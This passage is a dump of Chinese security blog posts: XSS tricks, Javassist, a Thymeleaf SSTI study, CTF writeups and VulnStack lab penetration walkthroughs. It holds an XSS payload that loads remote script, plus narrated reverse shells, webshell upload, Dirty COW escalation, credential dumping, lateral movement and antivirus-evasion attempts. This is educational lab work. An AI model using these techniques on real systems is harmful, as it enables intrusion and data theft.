使用 import('//domain/file')，这个需要使用同样的协议，加载的js的响应头中的content-type为application/javascript而且允许跨域加载Access-Control-Allow-Origin: *实战环境中的一些XSS小技巧 (qq.com) 使用一些特殊编码,例如: ㏕ -&gt; mil | Ⅷ -&gt; VIII | ㏒ -&gt; log 等等… 比如&lt;script/src=//⑭.₨&gt;，只有18个字符。其中₨代表印度卢比，这是1个字符，而不是2个字符，而⑭也是类似的效果。当受害者点击这个的时候会被跳转到14.rs，而14.rs上放我们的恶意js脚本： 更多的unicode字符： 利用JS全局变量绕过 比如payload： 一个字符转十六进制的脚本 常规防御 字符 说明 ｜ 西文竖线符号 &amp; &amp; 符号 ; 分号 $ 美元符号 % 百分比符号 @ at 符号 ’ 单引号 &quot; 引号 ' 反斜杠转义单引号 &quot; 反斜杠转义引号 &lt;&gt; 尖括号 () 括号 + 加号 CR 回车符，ASCII 0x0d LF 换行，ASCII 0x0a , 逗号 \\ 反斜杠 = 等号 验证用户的输入类型、长度、内容 比如要求的是整数，就用intval强转 比如需要手机号，就判断是否是11位的数字 如果数据内容是邮箱，就利用正则表达式匹配邮箱的组成 编码 httponly 这个cookie禁止js读取某些敏感cookie，使得完成了xss也无法获得数据 http only无法完全防御xss漏洞，之规定了js不能够去获取cookie的内容 所以它只能够防御用于获取cookie的问题 httponly在某些情况下也能够获得cookie 比如apache的400情况下应答存在缺陷等 trace协议 CSP 不提了，这个csp把我橄榄了不知道多少次 csp本质就是白名单，告诉客户端哪些东西可以加载和执行 富文本编辑器XSS修复 富文本编辑器本身支持部分标签，也就是说如果它必须至少要支持&lt;和&gt;才能够进行正常使用 所以可以从以下几个方面来进行修复： 设置标签白名单，如仅允许&lt;a&gt;、&lt;img&gt;等必要标签 为白名单标签的属性设置白名单，例如&lt;a&gt;只允许使用href等 限制这些href等属性内的输入，防止伪协议造成xss漏洞，禁止出现on.*等事件属性，就比如下面这种 URL可控 某些地方URL可控，所以利用javascript伪协议可以触发xss： 修复方式： 验证url是否合法，以http(s)😕/开头，如果不是就自动添加或者拒绝请求 对http(s)😕/后的内容进行url编码处理 JSONP 可能会利用callback函数修改xss语句导致xss漏洞 修复方式 "},{"title":"java基础-javassist","date":"2024-04-06T06:32:07.000Z","url":"/posts/8201.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"可能有人感觉自己写在博客上的java跨度太大了，其实是因为大多数的java笔记都写在本地上了。。。今天来点基础的 Javassist javassist是在java中编辑字节码的类库，它能够动态地定义一个新类，然后在JVM加载的时候修改类文件。它的原理和反射类似，但是开销相对较低 常用的api/类 ClassPool 通过ClassPool来创建一个类。 ClassPool.getDefault() 返回一个默认的ClassPool，一般取变量名为pool appendClassPath，insertClassPath 将一个ClassPath加载到类搜索路径的末尾位置，通过此方法写入额外的类搜索路径，避免在多个类加载器中找不到类 getCtClass、get 通过类路径名获取到该类的CtClass对象(获取类对象，常用于superClass，也就是类的继承上) makeClass(常用) 创建一个新的类 常用的创建类的方法就是这样： CtClass freeze：冻结一个类，使其不可被修改 isFrozen：判断一个类是否被冻结 deforst：解冻一个类，使其可以被修改。如果一个类要被deforst，则会禁止调用prune方法 prune：删除类不必要的属性，以减少内存占用，慎用此方法，因为调用之后会导致许多方法无法正常使用 detach：删除class writeFile：根据生成的class，将class写入到.class文件内 toClass：通过类加载器加载Class CtMethod insertBefore：在方法的起始位置插入代码 insertAfter：在方法的所有return语句前插入代码 insertAt：在指定位置插入代码 setBody：将方法的内容设置为要写入的代码，当方法被Abstract修饰的时候，该修饰符会被移除 make：创建一个新的方法 CtConstructor 创建类的构造方法： setBody：构造方法内写入代码 addConstructor：将构造方法写入类中 实例 创建一个Hello类 这样会将这个类生成到Javassist/Hello.class 往Hello类中添加属性 往Hello类中添加方法 设置返回类型： 发现其实并不支持String类型。所以如果要返回String类型，需要设置成pool.getCtClass(&quot;java.lang.String&quot;) 设置空方法： 添加方法体： 前置插入和后置插入（可以拿setBody做比较）： 注意，如果想要调用传入的var1，可以使用$i符号，其中i=1 可以看到insertBefore的在test语句前面，而after的在test后面，而且成功输出了var1的值 往Hello类中添加构造函数 设置构造函数： 设置了无参构造器 有参构造器设置如下： 修改已有的类 通过Classpool的get方法来获得已有的一个类，并且进行修改： 其实就是获取了一个Test类，然后将其的构造方法修改了 加载字节码 通过ctClass.toBytecode() 还有ctClass.toClass().newInstane() 常用修饰符 expr.MethodCall和ConstructorCall 通过MethodCall来找到对应关键字的方法 这里可以看S1nJa师傅的博客 我觉得这两个挺少用到的，所以就不展开了 Java基础—Javassist-CSDN博客 利用javassist缩短payload 在做D3CTF的shorter的时候发现了问题，如果利用TemplatesImpl加载字节码的话payload会很长(利用EqualsBean来缩短的时候也有3300左右) 所以这个时候动态加载字节码就派上用场了，发现动态加载TemplatesImpl会让payload缩短到1500： "},{"title":"Thymeleaf ssti","date":"2024-04-04T10:54:10.000Z","url":"/posts/49039.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"被红明谷打爆了，所以来学习thymeleaf ssti Thymeleaf是什么 Thymeleaf是springboot的一个引擎 要类比的话可以拿python中的jinja2来类比 jinja2是flask的一个引擎，它们都用于渲染前端页面 在写javaweb和ssm的时候前端可能会用jsp来写，springboot内是jar包内嵌tomcat，所以它不支持解析jsp文件。又由于单纯的静态html很不方便，所以就产生了thymeleaf这样的一个模板引擎 这样就只需要一个template就可以动态渲染前端了 基础知识 表达式 Thymeleaf中有很多种表达式： 变量表达式：$&#123;...&#125; 选择变量表达式：*&#123;...&#125; 消息表达式：#&#123;...&#125; 链接url表达式：@&#123;...&#125; 片段表达式：~&#123;...&#125; 内联表达式：[[]]或者[()] 通过这些表达式可以进行变量的引用、替换等 例如$&#123;name&#125;可以取到name的值 *&#123;...&#125;选定对象而不是整个上下文表达式，也就是说只要没有选定对象，$&#123;&#125;等效于*&#123;&#125; 片段表达式~&#123;&#125;可以用于引用公共的目标片段，比如在footer.html中定义了下面的一个copy片段：&lt;div th:fragment=&quot;copy&quot;&gt; 那么就可以通过~&#123;&#125;在另一模板中引用： 简单介绍一下片段表达式的语法： ~&#123;templatename::selector&#125;，会在/WEB-INF/templates/目录下寻找名为templatename的模板中定义的fragment ~&#123;templatename&#125;，这样会将整个templatename模板当作fragment ~&#123;::selector&#125;或者~&#123;this.selector&#125;，引用来自同一模板名为selector的fragment selector可以是通过th:fragment定义的片段，也可以是类选择器等 标签 thymeleaf还提供了一些内置的标签： 标签 作用 示例 th:id 替换id &lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt; th:text 文本替换 &lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt; th:utext 支持html的文本替换 &lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt; th:object 替换对象 &lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt; th:value 替换值 &lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt; th:each 迭代 &lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt; th:href 替换超链接 &lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;超链接&lt;/a&gt; th:src 替换资源 &lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt; 预处理语句 通过下面的语法可以对语句进行预处理： __$&#123;experssion&#125;__ 官方文档： 除了所有这些用于表达式处理的功能外，Thymeleaf 还具有预处理表达式的功能。 预处理是在正常表达式之前完成的表达式的执行，允许修改最终将执行的表达式。 预处理的表达式与普通表达式完全一样，但被双下划线符号（如__$&#123;expression&#125;__）包围。 预处理可以解析执行表达式，这就是ssti出现的最关键的一个的地方 通过可控的预处理输入的位置传入我们的恶意payload解析便可以达到任意代码执行 而我们要利用的就是这个表达式~&#123;...&#125;(虽然和它无关) 其中的templatename和selector都可以进行thymeleaf ssti 调试 调试我就不调了，可以看一下这位师傅写的 Java安全之Thymeleaf SSTI分析 - Zh1z3ven - 博客园 (cnblogs.com) 主要是调不动（ 漏洞复现 在thymeleaf中，回显的本质其实是通过抛出某个异常来实现的，在低版本的springboot(&lt;=2.2)中，server.error.include-message的默认值为always 因此这使得500页面会回显异常信息 但是在高版本下，上面的选项默认值改为了never，这使得500页面不会回显任何异常信息 所以回显的payload还是有点局限性 常规payload(无回显)： 常规payload(有回显)： 显而易见，只需要在::后加上任意内容即可回显 templatename 源码类似于： 它根据用户传入的lang参数，然后返回对应的user/lang/welcome模板(也有可能前面指定了一个固定路径) 在lang处打payload即可： 上面这个payload是有回显的 不过对于这个源码： 由于后面拼接上了/welcome 所以实际上return的值是这样的： 上面说过只要::后任意内容都可回显，所以此处加不加.x都会有回显 selector 源码如下： 可以看见它的可控点是一个selector的位置 同样的payload，但是它是无回显的，不管加不加.x 为什么呢？ 我们是通过抛出异常来回显的，但是实际上抛出的异常叫TemplateInputException，它是因为找不到templatename导致的异常抛出 所以templatename可控的地方是可以回显的 而selector可控的地方是无回显的： URI Path 看源码： 同样的payload，打到document的位置： 原理是mav的返回值为空，所以viewTemplateName会直接从uri中获取 特殊的trick :: ::的位置是可以挪到最前面的： post post方法也是可以的： 省略双下划线 如果单独引用template时，可以不使用双下划线包裹： 像上面这样就可以省略双下划线： 或者像这样的payload也是可以的： (再加多一对大括号也可以，具体可以看到这里：) 改造成利用反射获取 或者： 内联表达式 在boogipop师傅的博客里： [RealWorld CTF 6th 正赛/体验赛 部分 Web Writeup - Boogiepop Doesn’t Laugh (boogipop.com)]( CTF 6th 正赛_体验赛 部分 Web Writeup/) 源码简化后如下： 这种源码会根据使用的模板引擎进行渲染，这里当然时利用thymeleaf进行渲染 利用内联表达式进行rce： 记得url编码 例题 红明谷2024 Simp1escape 差点做出来了，就是不知道有thymeleafssti 审controller： 其实这里应该要看得出来它返回的是一个模板的。。。 唉 index其实就是一个hello world，返回了一个模板渲染的hello world Curl Controller： 简单的看看，其实就是根据用户传入的url参数来进行ssrf(curl)，然后将结果写到指定的地方：savePath + File.separator + hostname + ThymeleafProperties.DEFAULT_SUFFIX并返回 这里有点waf，首先是url要以http:或者https:开头，然后进行了一个isPrivateIp的判断： 他会进行一个本地ip的判断 所以我们不能够直接通过本地ip打ssrf admincontroller 可以看到熟悉的返回模板渲染： return new SpringTemplateEngine().process(hostname, new Context()); 而且hostname参数可控 唯一需求就是需要通过本地ip访问，刚好curl可以打本地请求 这里可以利用xctf x tpctf的short_url的思路，利用302跳转 我们的payload是利用内联表达式来执行： 稍加改进一下反弹shell： 这样就能把shell弹回来了"},{"title":"PicoCTF2024 Web Writeup","date":"2024-04-01T11:52:45.000Z","url":"/posts/6701.html","tags":[["Web","/tags/Web/"]],"categories":[["undefined",""]],"content":"清一下存货 Bookmarklet web方向的签到题 打开以后能看到上图的代码 然后将其放到控制台运行就能出flag了 WebDecode 打开f12查几个页面，在about.html的一个隐秘的地方发现了一串神秘字符串 放进赛博厨子就能解出来 Unminify 利用burp的内置浏览器打开f12即可，或者将f12后的源码直接复制到vscode中： IntroToBurp 抽象题 Trickster 简单的文件上传，利用.png.php即可绕过 再不行就加个PNG头 改一下用蚁剑连就好 No SQL Injection 抽象题目2 利用burp Nosql 注入从零到一_nosql注入-CSDN博客 Elements 接下来我要向您隆重介绍本次PicoCTF的抽象集大成者题目：Elements! 赛时： 如果对手是elements这种题目的话，可能会有点棘手呢？ 会ak的！ 你(elements)才是挑战者！ 赛后： 没有让elements大人使出全力真是抱歉 好了，看下这个b题是啥玩意 背景是一个在线合成网站，将两种元素放在一起就能合成新元素，而系统给了我们四种初始元素 其源码如下： index.mjs index.js (bot) 慢慢看可以看得出来在index.mjs中的/remoteCraft可以访问visit函数，visit函数里起了一个新的chromium浏览器进程，它会带着base64加密后的state访问127.0.0.1:8080 然后state就有我们的flag 接下来就是将flag带出的问题 这里很容易想到xss，而且题目一直在暗示我们xss remoteCraft里面需要我们传recipe参数，然后是一个json，json里面包含recipe和xss，它可以帮我们批量合成元素 然后xss和recipe都得有分别满足的条件 然后才能够进到visit 反正就是依托 再看index.js 有个evaluate函数能够eval我们传进去的state.xss 但是前面有检验 从总配方中取出配方再判断能不能合成xss(相当于问你有没有解锁xss，这里的found就是已经解锁的元素) 如果有就会eval(state.xss) 这里state = JSON.parse(atob(window.location.hash.slice(1))); 其实就是#后面的东西经过base64解码后的结果 这里不信可以自己手操一下 那这样就可以大概理解这个流程了： 先解锁xss这个元素(或者找到解锁xss的路径)，然后remoteCraft打payload 打完payload后进入visit函数，然后起了一个新的浏览器进程 该浏览器访问了127.0.0.1:8080，并且携带#data，data内有我们的payload 通过evaluate函数进行eval(data)，打xss并将flag带出 基本原理弄懂了，想打xss了，然后看看实际上有多困难 限制条件 CSP 在createServer里有一个csp： 这里我想利用johnfrod师傅的csp绕过： 绕csp 发现不行，他这个csp里的script-src不是unsafe-inline 而且也没有可以利用的cdn等网站 这里这个csp是基本上超级强大，如果有师傅知道这个csp能绕的话还请教教我T_T 浏览器 这里浏览器还有一个policy.json的限制 只允许访问127.0.0.1:8080，限制了其他的页面 chromium.diff 还有一段通过network_prediction_options:2的方式阻止了预加载 这里具体是啥呢？ 看了国外大佬的解释，这里是说对WebRTCpeerconnection打补丁，因为在WebRTC中有一种利用DNS解析的方式从子域向外部发送消息，从而绕过csp的方法 Content Security Policy (CSP) Bypass | Japanese - Ht | HackTricks 同样道理，利用link标签的dns-prefetch预读功能就能够通过DNS绕过CSP Content Security Policy (CSP) Bypass | Japanese - Ht | HackTricks 具体的文章也po在上面了 如果想看中文的可以看这个 Content Security Policy (CSP) Bypass | Chinese - Ht | HackTricks 所以各种绕csp的方法都被限制了 内核版本 我这里受到XCTF的xssbot的影响，想着也能够靠CVE-2023-4357的chromeXXE来读flag，但是并不行 这边可以根据出题人给的docker文件来起环境，然后查看内核版本 这里很可惜，是Chromium 122.0.6261.111 unstable 是一个很新的内核(xxe的影响版本在Chrome &lt; 116.0.5845.96) Chrome Platform Status (chromestatus.com) 这个网址可以查看最新版内核 突破 所以这个题就很离谱，各种防御都做上了，基本上找不到能绕过的点 所以出题者是想让我们寻找新的绕过csp方法 突破口在哪呢？ 在这个浏览器启动的参数： 可以发现它启用了实验性功能，这些实验性功能有些可能会不受csp的控制 这就是突破点了，找一下内核122(或者之前的实验性功能)，可以翻到Chrome 121里有一个fetch(它和xss里的fetch可能有联系) 这个api他能够发请求 大概意思是：他要在页面关掉之后才能发请求 pending-beacon/docs/fetch-later-api.md at main · WICG/pending-beacon · GitHub 反正读这个api就很抽象 按照平时页面关闭就能发请求，它这个肯定是能用了 但是它是直接把进程杀了。。。 导致请求发不过来，这就很难受 但是功夫不负有心人，可以在这个api文档里看到另一个pending-beacon-api(这个fetchlater的motivation) 它也是可以发请求的： 而且它还不需要等页面关闭，这里直接用这个pending beacon打就好了，注意，这里的pending beacon似乎只能够向https发送请求： 解决 利用脚本先找出xss的合成路线： 这里找到了合成路线如下： 然后根据assert的条件，recipe必须是个数组，可以得到： 然后放xss，这里由于要一个https的网址，所以我选用了webhook: webhook 打到/remoteCraft?recipe=处： 这里要urlencode一下 回到webhook已经收到res请求了 对它base64解码即可出flag"},{"title":"NKCTF2024 Write Up","date":"2024-03-25T05:25:16.000Z","url":"/posts/40439.html","tags":[["Web","/tags/Web/"]],"categories":[["undefined",""]],"content":"写一下wp my first cms 抽象，弱密码字典没有Admin123导致的 CMS Make Simple 2.2.19，直接搜一堆cve 但是都需要后台登录，后台在/admin 爆破就能拿到，但是得找一个好点的字典，唉。 已将Admin123添加入我的词典，cnmd 这里爆出来Admin123 进入后台随便打 全世界最简单的CTF 确实挺简单的，也很有意思。 考的nodejs vm虚拟机逃逸 访问/secret就可以找到源码： 简单看看吧，就是在主路由post的时候导致的。有waf，源码很简单 vm虚拟机逃逸的主要原因就在于我们能够通过原型链拿到外部的全局变量process，再通过process对象加载child_process导致rce。又或者能够获取到eval从而rce： 我们一个简单的payload是这样打的： 这里的this是指当前传递给runInNewContext的对象，这个对象不属于沙箱环境，此时能够通过constructor拿到构造器，再获取构造器的构造器，此时就会返回一个函数的构造器（[Function: Function]），此时构造return global就会返回global对象 然后接下来就是 就可以了 另一种方法是通过toString的构造器来获取 但是这种方法有一种限制，那就是沙箱不能置空。 这里如果是这样的情况的话，我们就不能够通过this对象拿到global了： 此时沙箱为null，我们this对象也是null，没有其他可以引用的函数 此时就得用arguments.callee.caller，它可以返回函数的调用者 我们在沙箱内定义一个函数，然后再在沙箱外调用这个函数，这样它就会返回沙箱外的一个对象，这样就能够进行逃逸了。例如下面重写了toString，如果下文有调用toString方法的就可以逃逸： 由于下面console.log进行了字符串拼接操作，这里就调用了toString，就能够逃逸出来： 如果下文没有调用函数，但是它访问了结果的一些属性，我们就可以将payload改成： 将code2定义成一个代理，然后在proxy里写恶意函数，当访问这个代理对象的任意属性时都会触发函数，造成rce 但是如果这些都没有怎么办呢 可以借助异常抛出： 抛出异常的时候就会报错，连带rce后的结果一起出来 回到这题。显而易见我们要构造第三种异常形式抛出的逃逸，所以payload的格式基本上就不变了。问题就在怎么绕waf。 这里就有两种处理方式 换 拼 换是什么呢？ 我们的payload里process比较难处理，我当时就打算换一个没有process的方法，也就是获取eval。 获取eval的方法在这里： nodejs代码执行绕过的一些技巧汇总_node.js_脚本之家 (jb51.net) 还记得java的反射吗？nodejs也能够通过反射获取到函数： 但是这里不对啊，要绕中括号 所以下面有个中括号的方法： 这里有个小trick 假如eval被过滤，可以通过includes(‘eva’)来获取，也可以通过startsWith(‘eva’)来获取 那就是通过反射获取到eval 那global呢？ 我们上面获取到的是process，所以改成global就可以了 接下来获取到了eval，那就要搞要执行的命令了 这里我利用上面文章的wp很容易就能够得出一条payload： cmd肯定是反弹shell，因为vm虚拟机逃逸无回显，对于解码的格式他也没有waf过滤掉，所以任意加密格式都可以，例如base64、十六进制 我们已经通过反射获取到eval了，我们再通过反射获取到Buffer.from即可 那怎么获取Buffer.from呢，看一下会发现Buffer.from其实可以通过Object.values获得： Object.values()返回对象自身的所有可枚举属性的数组 仔细看下Buffer： 他在Buffer的第二个位置，也就相当于Buffer[1] 这里利用Object.values(Buffer) 反射改造一下： 那中间Buffer再用反射获取一下就好了： 此时万事俱备 payload如下： 十六进制打反弹shell的payload就好了 为什么不用base64，因为base64过后我的payload有加号，绕不过waf 反弹过来的shell要读/readflag 我学弟这边用的是另一种拼接的方法 用到的是curl带出/readflag 挺好玩的这个payload 再看看官方解： 官方解注意到/secret路由中对process.__filename有个判断 但是正常情况下process是没有__filename这个函数的，所以我们可以想到原型链污染掉process.__filename： 就能够实现任意的文件读 源码里有个我们之前根本没用到的/hack.js 污染掉filename为/app/hack.js的时候进去读hack.js看到： 再读shell.js： 那这样，污染掉command，再利用下面网址的方法污染从而导致任意文件包含的效果：  这篇wp也非常有意思，有机会去仔细研究一下。 payload: attack_tacooooo 这题，没猜到密码是啥。。 反正两题都败在密码上了，唉，密码居然是这个人人名。 反正是个pgadmin的框架，那就搜咯 漏洞预警 | pgAdmin4反序列化漏洞 | CN-SEC 中文网 what can i say, mamba out poc直接打就行了 Shielder - pgAdmin (&lt;=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE) 这里nt.pickle是windows的 posix.pickle是linux的 我们稍微改一下它的python，就可以到这题了，没有bash， curl。可以试试nc反弹shell： 然后接下来的操作就是 进入Storage Manager组件(存储管理器) 上传posix.pickle 改cookie，将pga4_session改成../storage/&lt;email&gt;/posix.pickle!a，其中&lt;email&gt;改为当前登录用户的邮箱，@用下划线代替 其实应该是/storage的路径/tacooooo_qq.com/posix.pickle，pga4_session直接添加在原有的cookie里： 具体在哪呢？简单搜一下就看见了： 如何在pgAdmin4中永久保存标识文件的路径-腾讯云开发者社区-腾讯云 (tencent.com) 路径是/var/lib/pgadmin/storage 这题更是折磨，我复制poc的pickle 怎么打不了？ 自己写一个pickle就能打了，神经 shell弹过来以后访问crontab -l 这题难蚌密码 用过就是熟悉 有意思的thinkphp反序列化！ 这里可以通过db.sql找到guest的密码，如果没有的话就可以参考一下wp是怎么爆这个secret.txt的 相当于是偷步了，如果想看正解可以去看官方wp 进去后垃圾箱有个shell，还原到桌面，一个新建文档.html，上面是 这里太过于专注找rce洞了，没想到这个路径是能够直接访问的 代审发现了一个难蚌的东西： 他说这里有hint… 估计是想暗示我们在think文件夹下的问题 好家伙，这藏这么深。。。。 这里有个反序列化的点 那接下来找找有什么地方。再结合这个shell，不难想到可以想办法包含这个shell，那就是找include： 这个时候就能够全局搜索启动了，基本上锁定的都是think框架里的东西： 反正是挺折磨的，因为不知道要用哪个，太多同名却不能够用的函数，要找还是很麻烦的 这里官方给了一点也不算是小技巧的小技巧： 登录就找index或者login的文件 反序列化找call或者destruct 这里在app/controller/user/think/Config.php找到一个 这里call可以包含任意文件 我们先找链子，再研究thinkphp的反序列化怎么操作： 这边反正肯定是在这个test翻的，接下来就找什么东西能够触发call： 发现这个地方会调用$engine的config 结束 这里看似可控，但是参数不对。。。 看了挺多config函数，发现基本上触发不了 换个地方，核心思想就是找$this-&gt;a-&gt;b()，触发call，而且最好是我们熟悉的魔术方法 这里有个get get这里要看data是否可控 很明显，可控 所以我们要找个方法触发get，get是访问不存在的对象触发的 但是还是一样，搜索$this-&gt;a-&gt;b，慢慢找 审了我一年，终于找到 items-&gt;Loginout，并且items可控 接下来就是： 找触发toArray 这边在Collections里找到json_encode和json_serialize json_serialize没有别的类可以触发的(这边只有Collections.php和Paginator.php有，而且都是调用本类的toArray方法) 那就看看encode，找toJson方法： 发现了本类的__toString调用 找一个地方利用的，想起来好像什么地方有个东西直接拼接字符串的？ 好像是个filename的函数，搜一下 果然啊，在这里 直接拼接filename，并且files可控 找一下这个removeFiles的调用 找到了__destruct，入口 总结一下： 接下来就是变量要塞啥 tp的php反序列化要这么写，要多加命名空间，这个namespace可以在php的定义里看见： 发包给password，然后post 这里没回显，反弹shell测试下 本地起个docker测试一下 难蚌，debug了一下午发现少加了个windows： 最后一步engine那卡了挺久，这边调试了一下看看是什么情况 在传入$arguments的时候是call方法，而call方法的参数传进去默认就是一个array，可以给大家测试看看 我们确实是需要一个array，但是我们只需要一个array，call方法会再帮你加一个array，而data/files/shell就是为了符合include的路径 发现不能够bash反弹，nc反弹 这边用curl带出： 这里由于ls的原因导致不base64会导致我们的结果只有一行 读到flag "},{"title":"VulnStack 3","date":"2024-03-24T07:47:05.000Z","url":"/posts/8341.html","tags":[["渗透","/tags/%E6%B8%97%E9%80%8F/"]],"categories":[["undefined",""]],"content":"每次做红日靶场最痛苦的事情就是安装虚拟机，每次内存都爆满。。。 环境配置 这次需要配一张192.168.93.0的VMnet2网卡 然后把centos的网卡多设置一张NAT模式的就好了 把NAT改回111网段了 centos运行的时候要重新获取桥接模式的网卡ip： 总览 开打 信息搜集 现在啥都不知道，只能够对192.168.31.168进行渗透 wappalyzer显示是一个joomla的cms kscan扫端口，dirsearch扫目录： 扫出端口如下： 发现configuration.php~，里面有sql的密码 administrator有后台 尝试弱密码爆破(top3000)后台 爆破不了，不是弱密码 查找到2023的cve，发现不行 外网渗透 这边用navicat连一下数据库： 连上以后找一下有没有管理员的密码(搜一下users) 这边在am2zu_users里找到了 但是密码不是明文，这就有点难办了。这边查了一下joomla的管理员密码，发现有 可以试试 改完之后用administrator secret进来了 接下来就是随便找个地方传shell了 Joomla后台模板Getshell技巧-腾讯云开发者社区-腾讯云 (tencent.com) Extensions - Templates - Templates -选择error.php文件 写了个一句话木马，这里在左上角可以看到error.php in beez3 然后访问： 蚁剑连接： 虚拟终端打whoami返回ret=127，说明没权限 这边直接用蚁剑的bypassdisablefunction绕过 用这个GG UAF就可以了 但是用不了ifconfig 所以这边换成LD_PRELOAD 连到.antproxy.php，密码是刚刚的cmd 这下ok了 内网信息收集 ifconfig一下： 发现离谱的是地址居然是192.168.93.120 而不是我们的192.168.31.168 也就是说我们的192.168.31.168是公网ip，而192.168.93.120是内网的ip emm，接下来想上线msf，通过arch发现是64位的操作系统： 上线不了。。。而且很卡，得等一会 翻翻文件有什么东西。翻到了/tmp/mysql/test.txt 真的有人会藏东西到这地方吗 用linux的大概都知道，这里的意思就是新增了一个用户wwwuser，密码是wwwuser_123Aqx，这里可以通过SSH连接 进来了 连进ssh以后就可以想办法提权了 看一下有没有find的提权： 没得，看内核 2.6.32，可以用脏牛： GitHub - Rvn0xsy/linux_dirty: 更改后的脏牛提权代码，可以往任意文件写入任意内容，去除交互过程 适用条件： 1.目标服务器未打补丁 2.Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复） 这边直接用terminus的sftp传dirty.c gcc编译 然后 msf上线 重新执行一下这个shell 上线成功 简单添加一下路由和socks4代理。这里的内网端我们已经通过ifconfig扫出来是192.168.93.0端了 添加路由： 添加socks4代理： proxychains扫192.168.93端 …不知道是不是命令输错了，建议用msf的udp_probe模块探测： 这里解决了之前在Vulnstack2里的运行过慢问题，就是要提高线程((( 这里探测出了： proxychains上nmap继续扫： 10段扫的比较慢 后面直接就timeout了，无敌，等他扫完要20分钟？？？ 扫出来以后发现三台都有445，试试永恒之蓝能不能和他爆了 全部用不了，但是我们可以知道他们的系统是啥： 不能用永恒之蓝爆，换一种方式，用smb连接。爆一下smb密码 域控密码 爆20: 爆30： 也是123qwe!ASD 如果这边msf的爆不了可以换hydra hydra也有这个功能： 横向移动 用smb模块的psexec上线就好了，上线一台直接派生去cs爆 10的进不去 试试20和30的 20的能连，meterpreter弹过来了 能连 还是system权限 这边迁移到explorer.exe(PID 3800) 先关防火墙，开3389 20的机子拿下，但是10和30的机子不行 这边换成wmiexec GitHub - XiaoliChan/wmiexec-Pro: New generation of wmiexec.py wmiexec也是一种横向移动工具。它利用了WMI接口来远程管理windows系统。WMI是一个windows操作系统提供的系统管理工具。提供了一套API接口，可以对本地和远程Windows系统进行管理。如查看进程，执行命令，上传文件等 使用wmiexec前需要在目标机器上开启wmi服务，并且确保防火墙不会阻止和wmi服务的通信 usage: 拿到shell： 同样的操作关防火墙开3389 拿下 最后一台 拿下 这边还连不上，显示untrusted，这边试试添加一个用户： OK了 看一下域控里的文件就好了，flag在C:\\\\Users\\\\Administrator\\\\Docunments 这里如果只爆出一个密码的话，可以传mimikatz然后serkurlsa::logonpasswords 注意如果是win2012的机子的话，需要 "},{"title":"VulnStack 2","date":"2024-03-22T07:15:38.000Z","url":"/posts/57428.html","tags":[["渗透","/tags/%E6%B8%97%E9%80%8F/"]],"categories":[["undefined",""]],"content":"vulnstack 2 靶场，练一下，学习一下 环境配置 同样地，各虚拟机配置： 这边WEB机的服务器登录的时候会显示密码错误，需要恢复一下快照才能够正常执行 配置网卡： 内网VMet2的子网地址为10.10.10.0 VMet8还是使用NAT模式，子网地址192.168.239.0 然后配置一下网卡： WEB跟PC两张网卡，一张外网一张内网 这边由于作者写了它的公网ip段是111，所以这边改一下，改成了192.168.239.80，默认网关改为192.168.239.0 PC机和WEB一样 PC: WEB: DC就只用一张网卡： 然后到WEB机，打开C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin 以管理员身份分别运行setDomainENVa，startManageWeblogic，startWeblogic 汇总一下配置： 开打 信息收集 拿kscan扫一下WEB服务： 可以看到开了 其中7001是weblogic服务 访问一下： 这里直接访问是Error404，这里可以简单开扫一下： 扫到console可以进 weblogic 10.3.6.0 外网打点 拿liqunkit看看能不能爆weblogic 传一下冰蝎的webshell，liqunkit好像不太行，这边换WeblogicExploit(java端的我喜欢用冰蝎) GitHub - sp4zcmd/WeblogicExploit-GUI: Weblogic漏洞利用图形化工具 支持注入内存马、一键上传webshell、命令执行 连接一下 可以上线msf了 这边还可以利用冰蝎反弹shell 按照冰蝎上面的方法操作msf就行了 这边选2333端口打过来，meterpreter连上了 如果用传统的shell执行来弹msf，发现不行，怀疑有杀软。 这时候tasklist一下： 然后复制到： Windows杀软在线对比 (saucer-man.com) 发现了360 这边把冰蝎的shell派生给cs 发现不行，java的派生不了给msf？ 那接下来就两条路了，一是拿msf打 二是做免杀，然后派生cs然后getshell 总之先看msf打法： 内网信息收集 (1) 先看域信息 ipconfig : 发现10.10.10.0网段 systeminfo: net view失败: 确认域内电脑： shell直接给我弹出去了，无敌 想getsystem，根本不行 得，java的反弹shell根本不行，还是得去做免杀 免杀 用msf自带的自捆绑+编码方式尝试 自捆绑：使用msfvenom的-x参数可以指定一个自定义的可执行文件作为模板，并将payload嵌入其中，-x后跟对应文件路径即可 编码：使用msfvenom --list encoders可以查看所有的编码器，评级最高的就是cmd/powershell_base64和x86/shikata_ga_nai 吗的，还是被发现了，这360这么牛逼 用ShellCode_Loader也被拦。。。 服了。。 可能是病毒库更新了 寄，还真是。2024年3月22的了 那这边只能手动通过一下了，我操了 内网信息收集(2) getsystem好像不行。只能先收集点信息 域控： 用户： 域管： 传fscan扫内网，淦，冰蝎传不上： 试试蚁剑打内存马 可以了，蚁剑能正常传fscan 之前有个10.10.10网段的，开扫 ?不给运行？？？ 算了 那就搭socks代理进去吧 添加路由是为了让msf内的模块能够访问到内网服务，而搭socks代理能够让我们的软件访问到内网 添加路由 添加socks4 这里先background一下，后面用sessions -i session_id 加完之后就可以用nmap扫了，也可以用msf里的auxiliary/scanner/udp_probe进行探测 这个udp_probe慢的一批，我只能说 如果用其他软件对内网进行扫描的话要加proxychains4 通过proxychains4进行nmap扫描必须要添加以下参数 这里我的是3.1，所以改成proxychains 这里测试以下前面udp_probe爆出来的53端口来验证是否代理成功 不是system权限，kiwi爆不出来 总结一下： 派生cs 弹过来了 权限提升 试试提权，这里得把360关了，服。这就是最新病毒库吗 不然就是提不了一点 关闭防火墙 导出哈希，logonpasswords 导出了Administrator的密码和mssql的密码： 